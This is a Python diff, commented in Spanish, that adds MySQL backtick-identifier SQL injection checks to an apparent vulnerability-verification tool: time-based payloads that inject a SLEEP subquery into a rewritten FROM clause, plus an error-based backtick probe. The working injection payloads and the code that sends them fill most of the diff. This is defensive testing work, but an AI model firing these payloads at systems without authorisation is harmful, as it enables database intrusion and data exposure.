@@ -1511,6 +1511,7 @@ def verify_generic_sqli_blind(
     source_dir: str, endpoint: str, http_method: str, parameters,
     sqli_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
     budget_s: float = 900.0,
+    sqli_identifier_table_hint: str = "",
 ) -> WpVerifyResult:
     """SQL injection ciega por TIEMPO contra cualquier objetivo con su propio Dockerfile/compose.
     Deliberadamente mas limitada que verify_wordpress_sqli: sin saber el motor real de BD (puede
@@ -1518,6 +1519,13 @@ def verify_generic_sqli_blind(
     de MySQL) y el UNION-based (depende del numero de columnas Y de que el motor soporte UNION
     igual) no generalizan sin arriesgar falsos positivos/negativos por motor equivocado -- el
     retraso de una funcion SLEEP es la unica senal que vale casi igual en cualquier SQL.
+
+    sqli_identifier_table_hint: si se conoce el nombre real de la tabla (y la clausula GROUP BY),
+    activa la estrategia de inyeccion backtick-FROM: se rompe el identificador de columna con
+    una comilla invertida y se sustituye el FROM original por una subquery que incluye SLEEP en
+    el WHERE -- e.g. `x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 GROUP BY col-- -`
+    Con esto se puede verificar SQLi en contextos de identifiers MySQL (Django annotate(), etc.)
+    donde los payloads estandar de tipo 'valor' AND/OR SLEEP fallan por contexto sintatctico.
 
     Prueba dura contra falsos positivos por jitter de red/Docker: toma la MEDIANA de 2 peticiones
     de control (sin inyeccion) como linea base, y solo marca `verified=True` si el payload
@@ -1653,14 +1661,130 @@ def verify_generic_sqli_blind(
                     step(f"VERIFICADO (MSSQL WAITFOR): {sqli_param}={payload_val!r} retraso la "
                          f"respuesta de forma CONSISTENTE en 2 repeticiones independientes.")
 
+        # MYSQL BACKTICK IDENTIFIER FROM-INJECTION (time-based via SLEEP en WHERE):
+        # Cuando el parametro vulnerable se usa como ALIAS de columna en MySQL (Django annotate(),
+        # raw SQL AS `{col}`, etc.), los payloads estandar de tipo 'valor' AND/OR SLEEP no
+        # funcionan porque el contexto sintactico de AS <identifier> solo acepta un identificador
+        # simple -- cualquier operador despues del identificador es un error de sintaxis.
+        # Estrategia: romper el backtick para cerrar el identifier early, luego substituir el
+        # FROM original por uno que incluya SLEEP en el WHERE:
+        #   col = x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 {groupby}-- -
+        # Genera: ... AS `x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 {groupby}
+        # La subquery en el WHERE fuerza la evaluacion de SLEEP antes de la resolucion de
+        # columnas (MySQL evalua el WHERE por fila ANTES del GROUP BY / HAVING). Requiere
+        # conocer el nombre real de la tabla (sqli_identifier_table_hint).
+        if not found and sqli_identifier_table_hint:
+            # Parse hint: "table_name GROUP BY col" or "table_name WHERE cond GROUP BY col"
+            # We need to inject SLEEP in the WHERE clause BEFORE GROUP BY.
+            # Normalize: extract table name and groupby clause (if any).
+            _hint_upper = sqli_identifier_table_hint.upper()
+            if " GROUP BY" in _hint_upper:
+                _split_idx = _hint_upper.index(" GROUP BY")
+                _table_part = sqli_identifier_table_hint[:_split_idx].strip()
+                _groupby_part = " " + sqli_identifier_table_hint[_split_idx:].strip()
+            else:
+                _table_part = sqli_identifier_table_hint.strip()
+                _groupby_part = ""
+            step(f"probando inyeccion backtick-FROM (MySQL identifier) en {sqli_param}="
+                 f"<valor>`` FROM {_table_part}... "
+                 f"(SQLi en contexto de alias de columna)...")
+            for sleep_expr in _SQLI_SLEEP_EXPRS:
+                if found:
+                    break
+                payload_val = (f"{orig_value}`"
+                               f" FROM {_table_part}"
+                               f" WHERE (SELECT {sleep_expr} FROM DUAL)=0"
+                               f"{_groupby_part}-- -")
+                step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} "
+                     f"(backtick-FROM time-based)...")
+                t1 = timed_send(payload_val)
+                t2 = timed_send(payload_val)
+                entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
+                         "tiempo_2_s": round(t2, 2) if t2 else None,
+                         "estrategia": "backtick-FROM"}
+                tried.append(entry)
+                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
+                    found = True
+                    res.evidence["payload_ganador"] = payload_val
+                    res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
+                    res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
+                    res.evidence["estrategia"] = "backtick-FROM-injection"
+                    step(f"VERIFICADO (backtick-FROM): {sqli_param}={payload_val!r} retraso la "
+                         f"respuesta ~{round((t1+t2)/2, 1)}s CONSISTENTE en 2 repeticiones "
+                         f"-- SQLi de identifier MySQL (alias de columna) confirmada.")
+                    break
+
+        # MYSQL BACKTICK IDENTIFIER ERROR-BASED DETECTION (fallback):
+        # Si todos los payloads de tiempo fallan pero el parametro podria ser un identifier MySQL
+        # (backtick-quoting), un backtick literal en el valor causa un error de sintaxis SQL que
+        # cambia el codigo HTTP de 200 a 5xx. Este cambio diferencial prueba que la entrada
+        # del usuario llega sin sanitizar a un contexto SQL de identifier -- prueba mas debil que
+        # el time-based pero real. Se confirma verificando que el cuerpo de la respuesta de error
+        # contiene palabras clave de error MySQL ("SQL syntax", "1064", "mysql") para descartar
+        # errores de validacion propios de la aplicacion.
+        if not found:
+            step(f"probando deteccion error-based backtick para {sqli_param} "
+                 f"(MySQL identifier context, diferencial HTTP 2xx vs 5xx)...")
+            payload_backtick = f"{orig_value}`"
+            resp_bt = None
+            try:
+                payload_bt_dict = dict(base_params)
+                payload_bt_dict[sqli_param] = payload_backtick
+                resp_bt = _http_request(m, base_url + endpoint_path, timeout=15,
+                                        data=payload_bt_dict if m != "GET" else None,
+                                        params=payload_bt_dict if m == "GET" else None)
+            except Exception:
+                pass
+            if resp_bt is not None:
+                status_bt = getattr(resp_bt, "status_code", 0)
+                body_bt = (getattr(resp_bt, "text", "") or "")[:1000]
+                sql_error_markers = ("SQL syntax", "1064", "mysql", "syntax error",
+                                     "near", "1054", "unknown column", "OperationalError")
+                has_sql_error = any(m_kw.lower() in body_bt.lower() for m_kw in sql_error_markers)
+                # Solo marca como verificado si el codigo de control era 2xx Y la respuesta
+                # de inyeccion es 4xx/5xx Y el cuerpo contiene marcadores de error SQL
+                # (no un error de validacion propio de la app como "invalid input").
+                ctrl_resp = None
+                try:
+                    ctrl_dict = dict(base_params)
+                    ctrl_resp = _http_request(m, base_url + endpoint_path, timeout=10,
+                                              data=ctrl_dict if m != "GET" else None,
+                                              params=ctrl_dict if m == "GET" else None)
+                except Exception:
+                    pass
+                ctrl_status = getattr(ctrl_resp, "status_code", 0) if ctrl_resp else 0
+                if ctrl_status in range(200, 300) and status_bt >= 400 and has_sql_error:
+                    found = True
+                    res.evidence["payload_ganador"] = payload_backtick
+                    res.evidence["backtick_control_status"] = ctrl_status
+                    res.evidence["backtick_error_status"] = status_bt
+                    res.evidence["backtick_error_body_recorte"] = body_bt[:300]
+                    res.evidence["estrategia"] = "backtick-identifier-error-based"
+                    step(f"VERIFICADO (backtick error-based): {sqli_param}={payload_backtick!r} "
+                         f"cambio el codigo HTTP de {ctrl_status} a {status_bt} con error SQL "
+                         f"en el cuerpo -- input no sanitizado llega al contexto SQL de identifier "
+                         f"MySQL (backtick-quoting).")
+                else:
+                    step(f"backtick error-based: status_control={ctrl_status}, "
+                         f"status_bt={status_bt}, has_sql_error={has_sql_error} -- "
+                         f"no se confirmo inyeccion de identifier.")
+
         res.evidence["intentos"] = tried
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
-                          f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
-                          f"consistente en 2 peticiones independientes, por encima de la linea "
-                          f"base + la mitad del retraso pedido -- no es ruido de red/Docker")
+            estrategia = res.evidence.get("estrategia", "tiempo")
+            if estrategia == "backtick-identifier-error-based":
+                res.detail = (f"SQLI IDENTIFIER MYSQL confirmada (error-based): {sqli_param}="
+                              f"{res.evidence['payload_ganador']!r} cambio el codigo HTTP de "
+                              f"{res.evidence['backtick_control_status']} a "
+                              f"{res.evidence['backtick_error_status']} con error SQL en el cuerpo "
+                              f"-- la entrada llega sin sanitizar al contexto backtick de MySQL")
+            else:
+                res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
+                              f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
+                              f"consistente en 2 peticiones independientes, por encima de la linea "
+                              f"base + la mitad del retraso pedido -- no es ruido de red/Docker")
         else:
             res.ok = True
             res.detail = (f"se probaron {len(tried)} combinaciones de contexto/dialecto de "
